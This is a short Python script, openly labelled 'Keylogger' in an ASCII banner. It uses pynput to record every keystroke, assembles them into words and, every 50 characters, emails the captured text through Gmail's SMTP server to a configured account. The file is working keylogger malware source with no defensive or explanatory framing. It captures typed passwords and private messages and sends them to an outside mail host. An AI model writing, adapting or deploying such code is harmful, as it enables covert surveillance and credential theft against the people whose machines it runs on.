import smtplib
from pynput.keyboard import Key, Listener


print ('''
 _   __           _                             
| | / /          | |                            
| |/ /  ___ _   _| | ___   __ _  __ _  ___ _ __ 
|    \ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
| |\  \  __/ |_| | | (_) | (_| | (_| |  __/ |   
\_| \_/\___|\__, |_|\___/ \__, |\__, |\___|_|   
             __/ |         __/ | __/ |          
            |___/         |___/ |___/           
''')

email = "email"
password = "password"

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email,password)
print("logged in")

full_log = ""
word = ""
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ' '

        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ""
    
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word +=char
    if key == Key.esc:
        return False

def send_log():

    server.sendmail(
        email,
        email,
        full_log
        )
       
with Listener( on_press=on_press ) as listener:
    listener.join()
    
